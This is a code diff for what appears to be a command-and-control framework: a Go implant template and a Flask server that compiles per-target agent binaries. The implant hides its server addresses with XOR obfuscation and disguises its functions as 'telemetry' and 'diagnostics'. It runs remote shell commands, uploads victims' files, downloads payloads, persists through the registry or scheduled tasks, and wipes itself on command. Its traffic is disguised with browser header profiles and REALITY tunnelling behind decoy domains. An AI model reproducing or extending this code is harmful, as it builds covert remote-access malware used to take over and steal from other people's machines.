 func parseDiagnosticKey(s string) []byte {{
-	b, err := hex.DecodeString(s)
-	if err != nil {{
-		panic("config: invalid key hex: " + err.Error())
-	}}
-	return b
+\tb, err := hex.DecodeString(s)
+\tif err != nil {{
+\t\tpanic("config: invalid key hex: " + err.Error())
+\t}}
+\treturn b
 }}
 
 func assignEndpointID() string {{
-	b := make([]byte, 16)
-	rand.Read(b)
-	b[6] = (b[6] & 0x0f) | 0x40 // version 4
-	b[8] = (b[8] & 0x3f) | 0x80 // variant 10
-	return fmt.Sprintf("%08x-%04x-%04x-%04x-%012x", b[0:4], b[4:6], b[6:8], b[8:10], b[10:16])
+\tb := make([]byte, 16)
+\trand.Read(b)
+\tb[6] = (b[6] & 0x0f) | 0x40 // version 4
+\tb[8] = (b[8] & 0x3f) | 0x80 // variant 10
+\treturn fmt.Sprintf("%08x-%04x-%04x-%04x-%012x", b[0:4], b[4:6], b[6:8], b[8:10], b[10:16])
+}}
+
+func assignAgentSecret() string {{
+\tb := make([]byte, 32)
+\tif _, err := rand.Read(b); err != nil {{
+\t\tpanic("config: cannot generate agent secret: " + err.Error())
+\t}}
+\treturn hex.EncodeToString(b)
 }}
 
 func InitializeTelemetry() {{
-	// Decode all XOR-obfuscated strings into memory on startup.
-	TelemetryEndpoint = funcs.ResolveConfig(obfKey, "{enc_server_url}")
-	PathCheckin       = funcs.ResolveConfig(obfKey, "{enc_checkin_path}")
-	PathResult        = funcs.ResolveConfig(obfKey, "{enc_result_path}")
-	PathUpload        = funcs.ResolveConfig(obfKey, "{enc_upload_path}")
-	PathFiles         = funcs.ResolveConfig(obfKey, "{enc_files_path}")
-	FlushCommand      = funcs.ResolveConfig(obfKey, "{enc_flush_cmd}")
-	ServiceTag        = funcs.ResolveConfig(obfKey, "{enc_svc_label}")
-	funcs.ServiceLabel = ServiceTag
-	if "{enc_update_strat}" != "" {{
-		UpdateStrategy = funcs.ResolveConfig(obfKey, "{enc_update_strat}")
-		funcs.UpdateStrategy = UpdateStrategy
-	}}
-	if "{enc_cert_pin}" != "" {{
-		CertPin = funcs.ResolveConfig(obfKey, "{enc_cert_pin}")
-	}}
+\t// Decode all XOR-obfuscated strings into memory on startup.
+\tTelemetryEndpoint = funcs.ResolveConfig(obfKey, "{enc_server_url}")
+\tPathCheckin       = funcs.ResolveConfig(obfKey, "{enc_checkin_path}")
+\tPathResult        = funcs.ResolveConfig(obfKey, "{enc_result_path}")
+\tPathUpload        = funcs.ResolveConfig(obfKey, "{enc_upload_path}")
+\tPathFiles         = funcs.ResolveConfig(obfKey, "{enc_files_path}")
+\tFlushCommand      = funcs.ResolveConfig(obfKey, "{enc_flush_cmd}")
+\tServiceTag        = funcs.ResolveConfig(obfKey, "{enc_svc_label}")
+\tfuncs.ServiceLabel = ServiceTag
+\tif "{enc_update_strat}" != "" {{
+\t\tUpdateStrategy = funcs.ResolveConfig(obfKey, "{enc_update_strat}")
+\t\tfuncs.UpdateStrategy = UpdateStrategy
+\t}}
+\tif "{enc_cert_pin}" != "" {{
+\t\tCertPin = funcs.ResolveConfig(obfKey, "{enc_cert_pin}")
+\t}}
 
-	// If a pin is baked in but the URL is HTTP, something went wrong at build time.
-	// Panic rather than run in a broken state where pinning is silently skipped.
-	if CertPin != "" && !strings.HasPrefix(TelemetryEndpoint, "https://") {{
-		panic("config: cert pin is set but server URL is not HTTPS")
-	}}
+\t// If a pin is baked in but the URL is HTTP, something went wrong at build time.
+\t// Panic rather than run in a broken state where pinning is silently skipped.
+\tif CertPin != "" && !strings.HasPrefix(TelemetryEndpoint, "https://") {{
+\t\tpanic("config: cert pin is set but server URL is not HTTPS")
+\t}}
 
-	EndpointID = assignEndpointID()
+\tEndpointID = assignEndpointID()
+\tAgentSecret = assignAgentSecret()
 
-	profile, ok := funcs.Profiles[ProfileID]
-	if !ok {{
-		profile = funcs.Profiles[1] // fallback to Chrome/Windows
-	}}
+\tprofile, ok := funcs.Profiles[ProfileID]
+\tif !ok {{
+\t\tprofile = funcs.Profiles[1] // fallback to Chrome/Windows
+\t}}
 
-	// Set Accept-Language from the locale baked in at build time
-	profile.Headers["Accept-Language"] = Locale
+\t// Set Accept-Language from the locale baked in at build time
+\tprofile.Headers["Accept-Language"] = Locale
 
-	// Clone the default transport so we can set TLS options without touching
-	// the global default. If a pin is set, disable CA verification (which would
-	// reject self-signed certs) and replace it with the SPKI pin check.
-	baseTransport := http.DefaultTransport.(*http.Transport).Clone()
+{transport_init}
 
-	if CertPin != "" {{
-		baseTransport.TLSClientConfig = &tls.Config{{
-			InsecureSkipVerify: true,
-			VerifyPeerCertificate: funcs.MakePinVerifier(CertPin),
-		}}
-	}}
-
-	// Swap in our custom client so all outbound requests go through the
-	// browser profile transport rather than the plain default client.
-	http.DefaultClient = &http.Client{{
-		Transport: &funcs.UATransport{{
-			Base:    baseTransport,
-			Profile: profile,
-		}},
-	}}
+\t// Swap in our custom client so all outbound requests go through the
+\t// browser profile transport rather than the plain default client.
+\thttp.DefaultClient = &http.Client{{
+\t\tTransport: &funcs.UATransport{{
+\t\t\tBase:    baseTransport,
+\t\t\tProfile: profile,
+\t\t}},
+\t}}
 
 }}
 
@@ -642,6 +1034,8 @@ def _generate_main_go(persist_method):
 
 import (
 	"bytes"
+	"crypto/sha256"
+	"encoding/hex"
 	"encoding/json"
 	"fmt"
 	"io"
@@ -655,6 +1049,7 @@ import (
 
 type DeviceTelemetryPayload struct {{
 	EndpointID  string `json:"agent_id"`
+	AgentSecret string `json:"agent_secret"`
 	Hostname string `json:"hostname"`
 	OS       string `json:"os"`
 }}
@@ -672,16 +1067,40 @@ type DiagnosticJob struct {{
 
 type DiagnosticOutput struct {{
 	JobID int    `json:"task_id"`
+	EndpointID string `json:"agent_id"`
+	AgentSecret string `json:"agent_secret"`
+	ReportID string `json:"report_id"`
 	Output string `json:"output"`
 }}
 
+type ResultAcknowledgement struct {{
+	Status string `json:"status"`
+	EndpointID string `json:"agent_id"`
+	JobID int `json:"task_id"`
+	ReportID string `json:"report_id"`
+	OutputSHA256 string `json:"output_sha256"`
+	AlreadyRecorded bool `json:"already_recorded"`
+}}
+
 func main() {{
+	if err := acquireAgentProcessLock(); err != nil {{
+		return
+	}}
+	defer func() {{ _ = releaseAgentProcessLock(false) }}()
+
 	InitializeTelemetry()
+	if err := initializeDurableResultState(); err != nil {{
+		return
+	}}
+	if resumePendingCleanup() {{
+		return
+	}}
 {persist_block}
 	hostname, _ := os.Hostname()
 	agentOS := runtime.GOOS
 
 	for {{
+		retryQueuedResults()
 		jobs, err := SyncDeviceState(hostname, agentOS)
 		if err != nil {{
 			funcs.DelayNextSync(SyncDelayMin, SyncDelayMax)
@@ -690,8 +1109,8 @@ func main() {{
 
 		for _, job := range jobs {{
 			if job.Command == FlushCommand {{
-				_ = SubmitDiagnosticReport(job.ID, "Cache flush acknowledged. Cleaning up…")
-				funcs.WipeLocalCacheAndExit()
+				submitResultWithRetry(job.ID, "Cache flush acknowledged. Cleaning up…", true)
+				continue
 			}}
 
 			// cd is handled synchronously, it mutates CurrentDir which subsequent commands depend on
@@ -700,18 +1119,18 @@ func main() {{
 				if cdErr != nil {{
 					output = fmt.Sprintf("Error: %v", cdErr)
 				}}
-				_ = SubmitDiagnosticReport(job.ID, output)
+				submitResultWithRetry(job.ID, output, false)
 				continue
 			}}
 
 			if strings.HasPrefix(job.Command, "get ") {{
 				go func(t DiagnosticJob) {{
 					filePath := strings.TrimSpace(strings.TrimPrefix(t.Command, "get "))
-					output, err := funcs.SubmitCrashDump(TelemetryEndpoint+PathUpload, EndpointID, filePath, KeyID, EncryptionKey)
+					output, err := funcs.SubmitCrashDump(TelemetryEndpoint+PathUpload, EndpointID, AgentSecret, filePath, KeyID, EncryptionKey)
 					if err != nil {{
 						output = fmt.Sprintf("Upload error: %v", err)
 					}}
-					_ = SubmitDiagnosticReport(t.ID, output)
+					submitResultWithRetry(t.ID, output, false)
 				}}(job)
 				continue
 			}}
@@ -721,14 +1140,14 @@ func main() {{
 					args := strings.TrimSpace(strings.TrimPrefix(t.Command, "download "))
 					parts := strings.SplitN(args, " ", 2)
 					if len(parts) != 2 {{
-						_ = SubmitDiagnosticReport(t.ID, "Usage: download <file_id> <save_path>")
+						submitResultWithRetry(t.ID, "Usage: download <file_id> <save_path>", false)
 						return
 					}}
-					output, err := funcs.FetchUpdatePackage(TelemetryEndpoint+PathFiles, parts[0], strings.TrimSpace(parts[1]))
+					output, err := funcs.FetchUpdatePackage(TelemetryEndpoint+PathFiles, parts[0], strings.TrimSpace(parts[1]), EndpointID, AgentSecret, t.ID)
 					if err != nil {{
 						output = fmt.Sprintf("Download error: %v", err)
 					}}
-					_ = SubmitDiagnosticReport(t.ID, output)
+					submitResultWithRetry(t.ID, output, false)
 				}}(job)
 				continue
 			}}
@@ -747,7 +1166,7 @@ func main() {{
 				if execErr != nil && output == "" {{
 					output = fmt.Sprintf("Error: %v", execErr)
 				}}
-				_ = SubmitDiagnosticReport(t.ID, output)
+				submitResultWithRetry(t.ID, output, false)
 			}}(job)
 		}}
 
@@ -758,6 +1177,7 @@ func main() {{
 func SyncDeviceState(hostname, agentOS string) ([]DiagnosticJob, error) {{
 	payload := DeviceTelemetryPayload{{
 		EndpointID:  EndpointID,
+		AgentSecret: AgentSecret,
 		Hostname: hostname,
 		OS:       agentOS,
 	}}
@@ -787,13 +1207,51 @@ func SyncDeviceState(hostname, agentOS string) ([]DiagnosticJob, error) {{
 	return result.Jobs, nil
 }}
 
-func SubmitDiagnosticReport(jobID int, output string) error {{
+func SubmitDiagnosticReport(jobID int, output, reportID string) error {{
+	// encoding/json replaces invalid UTF-8 in strings. Normalize first so the
+	// payload and the acknowledgement digest always describe identical bytes.
+	output = string([]rune(output))
 	payload := DiagnosticOutput{{
 		JobID: jobID,
+		EndpointID: EndpointID,
+		AgentSecret: AgentSecret,
+		ReportID: reportID,
 		Output: output,
 	}}
-	_, err := transmitSecureTelemetry(TelemetryEndpoint+PathResult, payload)
-	return err
+	respBody, err := transmitSecureTelemetry(TelemetryEndpoint+PathResult, payload)
+	if err != nil {{
+		return err
+	}}
+
+	var envelope struct {{
+		KeyID string `json:"kid"`
+		Data string `json:"data"`
+	}}
+	if err := json.Unmarshal(respBody, &envelope); err != nil {{
+		return fmt.Errorf("result acknowledgement envelope: %w", err)
+	}}
+	if envelope.KeyID != KeyID || envelope.Data == "" {{
+		return fmt.Errorf("result acknowledgement envelope does not match this build")
+	}}
+
+	plain, err := funcs.UnsealTelemetry(EncryptionKey, envelope.Data)
+	if err != nil {{
+		return fmt.Errorf("authenticate result acknowledgement: %w", err)
+	}}
+	var acknowledgement ResultAcknowledgement
+	if err := json.Unmarshal(plain, &acknowledgement); err != nil {{
+		return fmt.Errorf("decode result acknowledgement: %w", err)
+	}}
+	digest := sha256.Sum256([]byte(output))
+	expectedDigest := hex.EncodeToString(digest[:])
+	if acknowledgement.Status != "ok" ||
+		acknowledgement.EndpointID != EndpointID ||
+		acknowledgement.JobID != jobID ||
+		acknowledgement.ReportID != reportID ||
+		acknowledgement.OutputSHA256 != expectedDigest {{
+		return fmt.Errorf("result acknowledgement does not match the submitted result")
+	}}
+	return nil
 }}
 
 // transmitSecureTelemetry JSON-encodes payload, encrypts it with AES-256-GCM,
@@ -828,7 +1286,12 @@ func transmitSecureTelemetry(url string, payload any) ([]byte, error) {{
 	}}
 
 	if resp.StatusCode != 200 {{
-		return nil, fmt.Errorf("server returned %d: %s", resp.StatusCode, string(respBody))
+		bodyStr := string(respBody)
+		if resp.StatusCode == 410 ||
+			(resp.StatusCode == 403 && strings.Contains(bodyStr, "Invalid agent identity")) {{
+			return nil, &errAgentIdentityGone{{StatusCode: resp.StatusCode, Body: bodyStr}}
+		}}
+		return nil, fmt.Errorf("server returned %d: %s", resp.StatusCode, bodyStr)
 	}}
 
 	return respBody, nil
@@ -842,7 +1305,7 @@ def build_agent():
     """Compile an agent binary with the given config and return the build ID."""
     data = request.get_json()
 
-    if not data:
+    if not isinstance(data, dict) or not data:
         return jsonify({"error": "Missing request body"}), 400
 
     target_os = data.get("target_os", "windows")
@@ -857,6 +1320,39 @@ def build_agent():
     profile_id = data.get("profile_id", 1)
     locale = data.get("locale", "en-US,en;q=0.9")
 
+    # Transport mode
+    transport_mode = data.get("transport_mode", "http")
+    valid_transport = ("http", "https_pinned", "reality")
+    if transport_mode not in valid_transport:
+        return jsonify({"error": f"transport_mode must be one of: {', '.join(valid_transport)}"}), 400
+
+    required_fields = ("target_os", "arch", "jitter_min", "jitter_max", "persist_method")
+    if transport_mode != "reality":
+        required_fields += ("server_url",)
+    missing = [field for field in required_fields if field not in data]
+    if missing:
+        return jsonify({"error": "Missing required build fields: " + ", ".join(missing)}), 400
+
+    # REALITY-specific params (only required when transport_mode is "reality")
+    reality_vps_addr = data.get("reality_vps_addr", "")
+    decoy_domain = data.get("decoy_domain", "")
+    reality_pubkey = data.get("reality_pubkey", "")
+    reality_shortid = data.get("reality_shortid", "")
+    vless_uuid = data.get("vless_uuid", "")
+
+    for field, value in (("server_url", server_url), ("locale", locale),
+                         ("reality_vps_addr", reality_vps_addr), ("decoy_domain", decoy_domain),
+                         ("reality_pubkey", reality_pubkey), ("reality_shortid", reality_shortid),
+                         ("vless_uuid", vless_uuid)):
+        if not isinstance(value, str):
+            return jsonify({"error": f"{field} must be a string"}), 400
+    for field, value in (("jitter_min", jitter_min_raw), ("jitter_max", jitter_max_raw),
+                         ("profile_id", profile_id)):
+        if isinstance(value, bool) or not isinstance(value, (int, str)):
+            return jsonify({"error": f"{field} must be an integer"}), 400
+        if isinstance(value, str) and not value.isdecimal():
+            return jsonify({"error": f"{field} must be an integer"}), 400
+
     # Validate target OS
     valid_os = ["windows", "linux", "mac"]
     if target_os not in valid_os:
@@ -866,17 +1362,23 @@ def build_agent():
     if target_os == "mac" and persist_method != "none":
         return jsonify({"error": "macOS agents do not support persistence. Set persist_method to 'none'."}), 400
 
-    # Validate architecture
-    valid_arch = ["amd64", "arm64", "386"]
+    valid_arch_by_os = {
+        "windows": ("amd64", "arm64", "386"),
+        "linux": ("amd64", "arm64", "386"),
+        "mac": ("amd64", "arm64"),
+    }
+    valid_arch = valid_arch_by_os[target_os]
     if arch not in valid_arch:
-        return jsonify({"error": f"Invalid arch. Must be one of: {valid_arch}"}), 400
+        return jsonify({
+            "error": f"Invalid arch for {target_os}. Must be one of: {list(valid_arch)}"
+        }), 400
 
     # Parse jitter_min
     try:
         jitter_min = int(jitter_min_raw)
         if jitter_min < 1 or jitter_min > 3600:
             return jsonify({"error": "jitter_min must be between 1 and 3600 seconds"}), 400
-    except ValueError:
+    except (ValueError, TypeError):
         return jsonify({"error": "jitter_min must be a number (seconds)"}), 400
 
     # Parse jitter_max
@@ -884,24 +1386,78 @@ def build_agent():
         jitter_max = int(jitter_max_raw)
         if jitter_max < 1 or jitter_max > 3600:
             return jsonify({"error": "jitter_max must be between 1 and 3600 seconds"}), 400
-    except ValueError:
+    except (ValueError, TypeError):
         return jsonify({"error": "jitter_max must be a number (seconds)"}), 400
 
     if jitter_min >= jitter_max:
         return jsonify({"error": "jitter_min must be less than jitter_max"}), 400
 
-    # Validate server URL
-    if not server_url.startswith("http://") and not server_url.startswith("https://"):
-        return jsonify({"error": "Server URL must start with http:// or https://"}), 400
+    # -- Transport-specific validation --
 
-    # For HTTPS builds, read the cert and compute the pin to bake into the binary.
-    # We block the build here if no cert exists rather than letting it compile
-    # a broken agent that silently fails at connection time.
     cert_pin = None
-    if server_url.startswith("https://"):
+
+    if transport_mode == "reality":
+        # REALITY mode: validate all 5 REALITY credentials
+        if not all([reality_vps_addr, decoy_domain, reality_pubkey, reality_shortid, vless_uuid]):
+            return jsonify({"error": "REALITY mode requires: reality_vps_addr, decoy_domain, reality_pubkey, reality_shortid, vless_uuid"}), 400
+
+        # VPS address must be host:port
+        if ":" not in reality_vps_addr:
+            return jsonify({"error": "reality_vps_addr must be in host:port format (e.g. 1.2.3.4:443)"}), 400
+
+        # Public key must base64-decode to exactly 32 bytes (X25519)
+        try:
+            import base64 as _b64
+            try:
+                pk_bytes = _b64.urlsafe_b64decode(reality_pubkey + "==")
+            except Exception:
+                pk_bytes = _b64.b64decode(reality_pubkey + "==")
+            if len(pk_bytes) != 32:
+                return jsonify({"error": f"reality_pubkey must decode to 32 bytes (X25519), got {len(pk_bytes)}"}), 400
+        except Exception:
+            return jsonify({"error": "reality_pubkey must be valid base64url-encoded X25519 public key"}), 400
+
+        # Short ID must hex-decode to ≤8 bytes
+        try:
+            sid_bytes = bytes.fromhex(reality_shortid)
+            if len(sid_bytes) > 8:
+                return jsonify({"error": f"reality_shortid must be ≤8 bytes when hex-decoded, got {len(sid_bytes)}"}), 400
+        except ValueError:
+            return jsonify({"error": "reality_shortid must be valid hex"}), 400
+
+        # VLESS UUID format check
+        import re as _re_uuid
+        uuid_pattern = r'^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$'
+        if not _re_uuid.match(uuid_pattern, vless_uuid):
+            return jsonify({"error": "vless_uuid must be a valid UUID (xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx)"}), 400
+
+        # The inner HTTP destination is the Flask service behind Xray.
+        server_url = "http://127.0.0.1:5000"
+
+    elif transport_mode == "https_pinned":
+        # Validate server URL
+        if not server_url.startswith("https://"):
+            return jsonify({"error": "HTTPS+pinned mode requires an https:// server URL"}), 400
+
+        # For HTTPS builds, read the cert and compute the pin to bake into the binary.
         cert_pin = _compute_cert_pin()
         if cert_pin is None:
             return jsonify({"error": "Server URL is HTTPS but no certificate found in server/certs/. Run gen_cert.py first."}), 400
+
+    else:
+        # HTTP mode
+        if not server_url.startswith("http://") and not server_url.startswith("https://"):
+            return jsonify({"error": "Server URL must start with http:// or https://"}), 400
+
+        # Still support auto-pin for http mode with https:// URL (backward compat)
+        if server_url.startswith("https://"):
+            cert_pin = _compute_cert_pin()
+            if cert_pin is None:
+                return jsonify({"error": "Server URL is HTTPS but no certificate found in server/certs/. Run gen_cert.py first."}), 400
+            # Normalize: a build with a cert pin IS an https_pinned build,
+            # regardless of what the UI submitted. This keeps stored metadata
+            # truthful so badges agree across build list and agent cards.
+            transport_mode = "https_pinned"
 
     # Validate profile_id
     try:
@@ -923,14 +1479,21 @@ def build_agent():
     # Create temp directory for the build
     tmp_dir = tempfile.mkdtemp(prefix="c2_build_")
 
+    created_artifact = None
     try:
         # Copy agent source to temp directory
         agent_src = os.path.abspath(AGENT_SRC_DIR)
         tmp_agent = os.path.join(tmp_dir, "agent")
         shutil.copytree(agent_src, tmp_agent)
 
-        # Generate key for this build
-        key_hex, key_id = generate_key()
+        # Generate unique key for this build
+        conn = get_db_connection()
+        while True:
+            key_hex, key_id = generate_key()
+            existing = conn.execute("SELECT 1 FROM builds WHERE key_id = ?", (key_id,)).fetchone()
+            if not existing:
+                break
+        conn.close()
 
         # Generate custom config.go
         config_content = _generate_config_go(
@@ -941,6 +1504,12 @@ def build_agent():
             path_upload=AGENT_PATH_UPLOAD,
             path_files=AGENT_PATH_FILES + "/",
             cert_pin=cert_pin or "",
+            transport_mode=transport_mode,
+            reality_vps_addr=reality_vps_addr,
+            decoy_domain=decoy_domain,
+            reality_pubkey=reality_pubkey,
+            reality_shortid=reality_shortid,
+            vless_uuid=vless_uuid,
         )
         with open(os.path.join(tmp_agent, "config.go"), "w", encoding="utf-8") as f:
             f.write(config_content)
@@ -967,7 +1536,7 @@ def build_agent():
         ldflags += " -buildid="
 
         result = subprocess.run(
-            ["go", "build", "-trimpath", "-ldflags", ldflags, "-o", output_path, "."],
+            ["go", "build", "-buildvcs=false", "-trimpath", "-ldflags", ldflags, "-o", output_path, "."],
             cwd=tmp_agent,
             env=env,
             capture_output=True,
@@ -979,37 +1548,57 @@ def build_agent():
             error_msg = result.stderr or result.stdout or "Unknown build error"
             return jsonify({"error": f"Build failed: {error_msg}"}), 500
 
-        # Move binary to builds directory
-        final_path = os.path.join(BUILDS_DIR, filename)
-
-        # If file already exists, add a timestamp
-        if os.path.exists(final_path):
-            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-            name, extension = os.path.splitext(filename)
-            filename = f"{name}_{timestamp}{extension}"
-            final_path = os.path.join(BUILDS_DIR, filename)
-
-        shutil.move(output_path, final_path)
-        os.chmod(final_path, 0o755)
+        # Reserve the final name exclusively, even across concurrent requests.
+        name, extension = os.path.splitext(filename)
+        for _ in range(20):
+            candidate = f"{name}_{os.urandom(8).hex()}{extension}"
+            final_path = os.path.join(BUILDS_DIR, candidate)
+            try:
+                fd = os.open(final_path, os.O_WRONLY | os.O_CREAT | os.O_EXCL, 0o700)
+                created_artifact = final_path
+                filename = candidate
+                break
+            except FileExistsError:
+                continue
+        else:
+            raise OSError("Could not allocate a unique build artifact name")
+        try:
+            with open(output_path, "rb") as source, os.fdopen(fd, "wb") as destination:
+                shutil.copyfileobj(source, destination)
+                destination.flush()
+                os.fsync(destination.fileno())
+        except Exception:
+            # fdopen owns fd after success; close it if opening the source failed.
+            try:
+                os.close(fd)
+            except OSError:
+                pass
+            raise
+        os.chmod(final_path, 0o700)
         file_size = os.path.getsize(final_path)
 
         # save build record
         conn = get_db_connection()
-        cursor = conn.execute(
-            "INSERT INTO builds (filename, target_os, arch, server_url, callback_interval, persistence, file_path, file_size, key_id, encryption_key, cert_pin) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
-            (filename, target_os, arch, server_url, f"{jitter_min}s-{jitter_max}s", persist_method, final_path, file_size, key_id, key_hex, cert_pin),
-        )
-        build_id = cursor.lastrowid
-        conn.commit()
-        conn.close()
+        try:
+            cursor = conn.execute(
+                "INSERT INTO builds (filename, target_os, arch, server_url, callback_interval, persistence, file_path, file_size, key_id, encryption_key, cert_pin, transport_mode, decoy_domain) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
+                (filename, target_os, arch, server_url, f"{jitter_min}s-{jitter_max}s", persist_method, final_path, file_size, key_id, key_hex, cert_pin, transport_mode, decoy_domain or None),
+            )
+            build_id = cursor.lastrowid
+            conn.commit()
+        finally:
+            conn.close()
+        created_artifact = None
 
         return jsonify({
             "status": "ok",
             "build_id": build_id,
             "filename": filename,
             "file_size": file_size,
+            "transport_mode": transport_mode,
             "tls_pinned": cert_pin is not None,
             "cert_pin_prefix": cert_pin[:16] + "..." if cert_pin else None,
+            "decoy_domain": decoy_domain or None,
         })
 
     except subprocess.TimeoutExpired:
@@ -1017,15 +1606,51 @@ def build_agent():
     except Exception as e:
         return jsonify({"error": f"Build error: {str(e)}"}), 500
     finally:
+        if created_artifact is not None:
+            try:
+                os.remove(created_artifact)
+            except FileNotFoundError:
+                pass
+            except OSError:
+                app.logger.exception("Could not clean up unrecorded build artifact: %s", created_artifact)
         # Clean up temp directory
         shutil.rmtree(tmp_dir, ignore_errors=True)
+
+
+@app.route("/api/reality/check-domain", methods=["POST"])
+def check_decoy_domain():
+    """Estimate whether a public site's certificate record fits REALITY's limit."""
+    data = request.get_json()
+    if not isinstance(data, dict) or "domain" not in data:
+        return jsonify({"error": "Missing 'domain' field"}), 400
+    import socket
+    import ssl
+    try:
+        cert_bytes = measure_certificate_record(data["domain"])
+        return jsonify({
+            "ok": True,
+            "size_bytes": cert_bytes,
+            "limit_bytes": REALITY_CERTIFICATE_LIMIT_BYTES,
+            "fits": cert_bytes <= REALITY_CERTIFICATE_LIMIT_BYTES,
+        })
+    except ProbeInputError as exc:
+        return jsonify({"ok": False, "error": str(exc)}), 400
+    except ProbeDenied as exc:
+        return jsonify({"ok": False, "error": str(exc)}), 403
+    except socket.timeout:
+        return jsonify({"ok": False, "error": "Certificate measurement timed out."}), 504
+    except socket.gaierror:
+        return jsonify({"ok": False, "error": "DNS resolution failed for this domain."}), 502
+    except ssl.SSLError:
+        return jsonify({"ok": False, "error": "The TLS handshake failed."}), 502
+    except OSError:
+        return jsonify({"ok": False, "error": "Could not measure the site's certificate."}), 502
 
 
 @app.route("/api/tls/status", methods=["GET"])
 def tls_status():
     """Read the cert on disk and return its details plus the SPKI pin."""
-    cert_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "certs", "server.crt")
-    key_path  = os.path.join(os.path.dirname(os.path.abspath(__file__)), "certs", "server.key")
+    cert_path, key_path = _active_tls_paths()
 
     if not os.path.exists(cert_path) or not os.path.exists(key_path):
         return jsonify({"enabled": False, "cert": None})
@@ -1070,13 +1695,29 @@ def tls_status():
 
 @app.route("/api/tls/generate", methods=["POST"])
 def tls_generate():
-    """Generate a new self-signed cert and write it to the certs directory."""
-    data = request.get_json() or {}
+    """Generate, validate, and atomically publish a self-signed PEM bundle."""
+    data = request.get_json(silent=True)
+    if not isinstance(data, dict):
+        return jsonify({"error": "Request body must be a valid JSON object"}), 400
 
-    cn      = data.get("cn", "localhost").strip()
-    san_ips = [s.strip() for s in data.get("san_ips", []) if s.strip()]
-    san_dns = [s.strip() for s in data.get("san_dns", []) if s.strip()]
-    days    = int(data.get("days", 365))
+    cn = data.get("cn", "localhost")
+    san_ips = data.get("san_ips", [])
+    san_dns = data.get("san_dns", [])
+    days_raw = data.get("days", 365)
+    if not isinstance(cn, str):
+        return jsonify({"error": "cn must be a string"}), 400
+    if (not isinstance(san_ips, list) or not all(isinstance(s, str) for s in san_ips) or
+            not isinstance(san_dns, list) or not all(isinstance(s, str) for s in san_dns)):
+        return jsonify({"error": "san_ips and san_dns must be lists of strings"}), 400
+    if isinstance(days_raw, bool) or not isinstance(days_raw, (int, str)) or (isinstance(days_raw, str) and not days_raw.isdecimal()):
+        return jsonify({"error": "days must be an integer"}), 400
+    try:
+        days = int(days_raw)
+    except ValueError:
+        return jsonify({"error": "days must be an integer between 1 and 3650"}), 400
+    cn = cn.strip()
+    san_ips = [s.strip() for s in san_ips if s.strip()]
+    san_dns = [s.strip() for s in san_dns if s.strip()]
 
     if not cn:
         return jsonify({"error": "cn is required"}), 400
@@ -1090,9 +1731,6 @@ def tls_generate():
         except ValueError:
             return jsonify({"error": f"Invalid IP address: {ip}"}), 400
 
-    certs_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "certs")
-    os.makedirs(certs_dir, exist_ok=True)
-
     # Import cert generation deps inline so gen_cert.py stays a standalone script.
     import datetime, hashlib, ipaddress as _ipaddress
     from cryptography import x509
@@ -1100,17 +1738,24 @@ def tls_generate():
     from cryptography.hazmat.primitives.asymmetric import rsa
     from cryptography.x509.oid import NameOID
 
-    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
-
-    subject = issuer = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, cn)])
-
-    san_entries = []
-    for dns_name in san_dns:
-        san_entries.append(x509.DNSName(dns_name))
+    # Validate user-controlled X.509 values before generating a key or touching
+    # the active certificate. The library enforces the CN's encoded byte limit.
+    try:
+        subject = issuer = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, cn)])
+    except ValueError as exc:
+        return jsonify({"error": f"Invalid cn: {exc}"}), 400
+    try:
+        san_entries = [x509.DNSName(dns_name) for dns_name in san_dns]
+        if cn not in san_dns:
+            san_entries.insert(0, x509.DNSName(cn))
+    except ValueError as exc:
+        return jsonify({"error": f"Invalid DNS name in cn or san_dns: {exc}"}), 400
     for ip_str in san_ips:
         san_entries.append(x509.IPAddress(_ipaddress.ip_address(ip_str)))
-    if cn not in san_dns:
-        san_entries.insert(0, x509.DNSName(cn))
+
+    certs_dir = CERTS_DIR
+    os.makedirs(certs_dir, exist_ok=True)
+    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
 
     now = datetime.datetime.now(datetime.timezone.utc)
     cert = (
@@ -1126,22 +1771,13 @@ def tls_generate():
         .sign(key, hashes.SHA256())
     )
 
-    key_path  = os.path.join(certs_dir, "server.key")
-    cert_path = os.path.join(certs_dir, "server.crt")
-
-    with open(key_path, "wb") as f:
-        f.write(key.private_bytes(
-            serialization.Encoding.PEM,
-            serialization.PrivateFormat.TraditionalOpenSSL,
-            serialization.NoEncryption(),
-        ))
-    try:
-        os.chmod(key_path, 0o600)
-    except OSError:
-        pass
-
-    with open(cert_path, "wb") as f:
-        f.write(cert.public_bytes(serialization.Encoding.PEM))
+    cert_pem = cert.public_bytes(serialization.Encoding.PEM)
+    key_pem = key.private_bytes(
+        serialization.Encoding.PEM,
+        serialization.PrivateFormat.TraditionalOpenSSL,
+        serialization.NoEncryption(),
+    )
+    publish_certificate_bundle(certs_dir, cert_pem, key_pem)
 
     spki_bytes = cert.public_key().public_bytes(
         serialization.Encoding.DER, serialization.PublicFormat.SubjectPublicKeyInfo
@@ -1159,15 +1795,20 @@ def tls_generate():
 @app.route("/api/tls/delete", methods=["DELETE"])
 def tls_delete():
     """Remove the cert and key files from disk. Server falls back to HTTP on next restart."""
-    certs_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "certs")
+    certs_dir = CERTS_DIR
     cert_path = os.path.join(certs_dir, "server.crt")
     key_path  = os.path.join(certs_dir, "server.key")
 
     removed = []
+    bundle_path = os.path.join(certs_dir, "server.pem")
+    # Remove legacy fallback first; the active bundle remains available if this fails.
     for p, label in [(cert_path, "server.crt"), (key_path, "server.key")]:
         if os.path.exists(p):
             os.remove(p)
             removed.append(label)
+    if os.path.exists(bundle_path):
+        os.remove(bundle_path)
+        removed.append("server.pem")
 
     if not removed:
         return jsonify({"error": "No certificate files found"}), 404
@@ -1194,6 +1835,8 @@ def get_builds():
                 "persistence": b["persistence"] if b["persistence"] in ("none", "registry", "scheduled_task") else ("registry" if b["persistence"] else "none"),
                 "file_size": b["file_size"],
